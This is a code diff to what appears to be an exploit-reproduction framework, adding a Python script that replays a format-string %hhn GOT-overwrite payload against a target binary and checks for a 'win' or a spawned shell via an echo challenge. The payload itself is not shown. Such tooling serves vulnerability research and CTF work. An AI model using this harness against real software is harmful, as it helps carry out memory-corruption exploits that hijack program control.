@@ -1607,6 +1607,90 @@ print("[-] format-string GOT overwrite did not confirm"); sys.exit(1)
 '''
 
 
+_FORMAT_WRITE_REPLAY = b'''#!/usr/bin/env python3
+"""Replay an analyst format-string %hhn write-what-where that redirects a GOT slot to a win.
+
+No-PIE, so the write payload is static (input.bin). Deliver it on the measured channel; the next
+call through the overwritten GOT slot runs the win. A win that PRINTS is graded by its regex; a
+win that drops a SHELL by an arithmetic challenge only a real shell evaluates. Exit 0 = reproduced.
+RUN IN A SANDBOX/VM -- runs an untrusted binary. Authorized use only."""
+import json
+import os
+import random
+import re
+import select
+import subprocess
+import sys
+import time
+
+here = os.path.dirname(os.path.abspath(__file__))
+spec = json.load(open(os.path.join(here, "fmtwrite.json")))
+exe = sys.argv[1] if len(sys.argv) > 1 else "./target.bin"
+with open(os.path.join(here, "input.bin"), "rb") as f:
+    payload = f.read()
+argv = list(spec.get("argv") or [])
+stdin0 = b""
+if spec["mode"] == "file":
+    carrier = os.path.join(here, "input.bin")
+    argv = [carrier if a == "@@" else a for a in argv] if "@@" in argv else argv + [carrier]
+elif spec["mode"] == "arg":
+    s = payload.split(b"\\0", 1)[0].decode("latin-1")
+    argv = [s if a == "@@" else a for a in argv] if "@@" in argv else argv + [s]
+else:
+    stdin0 = payload
+
+
+def read_until(p, deadline, quiet=0.3):
+    out, last = b"", time.time()
+    while time.time() < deadline:
+        r, _, _ = select.select([p.stdout], [], [], 0.1)
+        if r:
+            c = os.read(p.stdout.fileno(), 4096)
+            if not c: break
+            out, last = out + c, time.time()
+        elif p.poll() is not None: break
+        elif out and time.time() - last > quiet: break
+    return out
+
+
+p = subprocess.Popen([exe] + argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                     stderr=subprocess.STDOUT, cwd=here)
+a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+try:
+    if stdin0: p.stdin.write(stdin0); p.stdin.flush()
+    time.sleep(0.3)
+    if spec.get("shell"):
+        p.stdin.write(b"echo LYKOS_SHELL_$((%d*%d))\\n" % (a, b)); p.stdin.flush()
+    else:
+        p.stdin.write(b"\\n")                             # nudge one more loop iteration to the win
+        p.stdin.flush()
+except (BrokenPipeError, OSError):
+    pass
+out = read_until(p, time.time() + float(spec.get("timeout", 6)), quiet=1.2)
+p.kill()
+sys.stdout.write(out.decode("latin-1", "ignore"))
+ok = ((b"LYKOS_SHELL_%d" % (a * b)) in out if spec.get("shell")
+      else re.search(spec["success_regex"].encode(), out) is not None)
+print("\\n[+] win reached via the GOT overwrite" if ok else "\\n[-] win not reached")
+sys.exit(0 if ok else 1)
+'''
+
+
+def format_write_replay(mode, argv, payload, meta, *, success_regex=None, shell=False,
+                        timeout: float = 6.0) -> tuple[str, dict]:
+    """(run_cmd, extra_files) for an analyst %hhn write-what-where; sets meta's verdict. The write
+    payload is static (no-PIE), shipped as input.bin; the bundle used to run it through the generic
+    signal runner, which reported the post-win crash code (139) instead of whether the win fired."""
+    meta["verdict"] = {"exit": "zero", "script": "runner.sh",
+                       "note": "runner.sh delivers the %hhn write and exits 0 printing [+] when the "
+                               "GOT overwrite made the target reach the win"}
+    spec = {"mode": mode if mode in ("file", "arg") else "stdin",
+            "argv": [str(a) for a in argv or []], "shell": bool(shell),
+            "success_regex": success_regex or "", "timeout": timeout}
+    return ("python3 ./replay_fmtwrite.py ./target.bin",
+            {"replay_fmtwrite.py": _FORMAT_WRITE_REPLAY, "fmtwrite.json": json.dumps(spec).encode()})
+
+
 def format_got_replay(argv, printf_got, system_off, leak_got, leak_off, meta,
                       word: int = 8, timeout: float = 8.0) -> tuple[str, dict]:
     """(run_cmd, extra_files) for a format-string GOT-overwrite shell; sets meta's verdict and
